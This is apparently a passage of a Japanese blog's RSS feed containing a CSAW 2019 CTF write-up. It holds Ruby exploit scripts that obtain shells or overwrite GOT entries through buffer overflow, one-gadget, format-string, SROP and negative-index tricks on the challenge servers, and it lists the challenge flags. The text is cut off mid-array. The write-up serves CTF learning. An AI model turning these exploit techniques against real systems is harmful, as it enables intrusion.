&lt;h2 id=&#34;4-おわりに&#34;&gt;4. おわりに&lt;/h2&gt;

&lt;p&gt;本記事では、CTFの問題を使ってWindows におけるExploitのための環境構築方法やLinuxとの差について簡単に記した。本問題は、古い問題のためセキュリティ機構などもゆるい。現実の世界でのExploitは、もっと難しいはずだ。しかしながら、本問題のような簡単なBOFを利用したROPなどの古典的なテクニックを理解しておくことで、脅威の度合いについて正しく理解できるだろう。余力があれば、さらに異なるWindows Exploit 問題のWriteupを書いていきたい。&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Csaw2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/csaw2019/</link>
      <pubDate>Mon, 16 Sep 2019 09:50:28 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/csaw2019/</guid>
      <description>

&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;

&lt;h3 id=&#34;mcgriddlev2&#34;&gt;mcgriddlev2&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;問題文にFLAGが記載されている&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;flag{W3lcome_7o_CSAW_QUALS_2019!}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;pwn&#34;&gt;Pwn&lt;/h2&gt;

&lt;h3 id=&#34;baby-boi-50pt&#34;&gt;baby_boi (50pt)&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;シンプルなBOFでIPが奪える問題&lt;/li&gt;

&lt;li&gt;&lt;p&gt;libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;8888&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1005&lt;/span&gt;
libc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ELF&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./libc-2.27.so&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#libc = ELF.new &amp;#34;/lib/x86_64-linux-gnu/libc-2.29.so&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
libc_printf &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/: (.+)/&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
libc_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_printf &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;printf&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% libc_base
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;payload &lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;40&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(libc_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x4f322&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline(payload)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{baby_boi_dodooo_doo_doo_dooo}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;got-milk-50pt&#34;&gt;GOT Milk? (50pt)&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;独自の共有オブジェクトとバイナリが配られる&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set LD_LIBRARY_PATH ./&lt;/code&gt; でカレントディレクトリの共有オブジェクトを見るようにする&lt;/li&gt;

&lt;li&gt;&lt;p&gt;FSBがあるので、それを使ってGOT Overwriteする&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;fsa&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#$z = Sock.new &amp;#34;localhost&amp;#34;, 8888&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1004&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
value &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x89&lt;/span&gt;
fmt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;FSA&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new()
fmt&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0x804a010&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; value
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; fmt&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;payload(&lt;span style=&#34;color:#666&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# index of argument&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline(payload)
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{y0u_g00000t_mi1k_4_M3!?}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;small-boi-100pt&#34;&gt;small_boi (100pt)&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;statically linked でstrippedな小さなバイナリが与えられる&lt;/li&gt;

&lt;li&gt;&lt;p&gt;sig_return システムコールを呼ぶようなraxの設定のされ方があるのと自明なBOFがあるので、Sigreturn ROP (SROP) で &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)&lt;/code&gt; を実行する&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SROPは、スタックの値を使ってsig_return実行時にレジスタの値を代入する攻撃&lt;/li&gt;

&lt;li&gt;&lt;p&gt;これを使ってrdiやrsi、ripなどが設定できるため任意のシステムコールを呼べる&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#$z = Sock.new &amp;#34;localhost&amp;#34;, 8888&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1002&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x28&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x40017c&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;4&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# r8~r15&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x4001ca&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rdi = /bin/sh&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rsi&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rbp&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# &lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# &lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x3b&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rax = 0x3b &lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rcx&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)   &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rsp&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x00400185&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rip = syscall&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# eflags&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0x33&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# cs&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0x2b&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# ss&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# err ~ union&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# reserved[8]&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{sigrop_pop_pop_pop}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;traveller&#34;&gt;traveller&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;解けなかったのでwriteupを見た&lt;/li&gt;
&lt;li&gt;Off-by-oneがあるためHeap問題かと思ったら操作対象のインデックスの入力に負数が入力できるOOB問題&lt;/li&gt;

&lt;li&gt;&lt;p&gt;編集コマンドで、&lt;code&gt;-50&lt;/code&gt; をするとfree@gotを書き換えられたのでこれを使って&lt;code&gt;cat_flag&lt;/code&gt;関数に飛ばす&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1003&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#elf = ELF.new &amp;#34;./traveller&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#libc = ELF.new &amp;#34;./libc-2.23.so&amp;#34;&lt;/span&gt;
context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:debug&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;add&lt;/span&gt;(dist, dest)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dest
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;change&lt;/span&gt;(dist, dest)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;send dest
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;delete&lt;/span&gt;(dist)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;check&lt;/span&gt;(dist)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;return&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
tmp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
stack_address &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; tmp&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/.\n(.*) \n\n/&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
add(&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;AAAAAAAA&amp;#34;&lt;/span&gt;)
change(&lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;50&lt;/span&gt;, p64(&lt;span style=&#34;color:#666&#34;&gt;0x4008b6&lt;/span&gt;))
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; delete(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{h0pe_y0u_3nj0y_ur_j0urn3y}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;rev&#34;&gt;Rev&lt;/h2&gt;

&lt;h3 id=&#34;beleaf&#34;&gt;Beleaf&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

idxs &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x9&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x8&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x9&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x4&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x5&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span 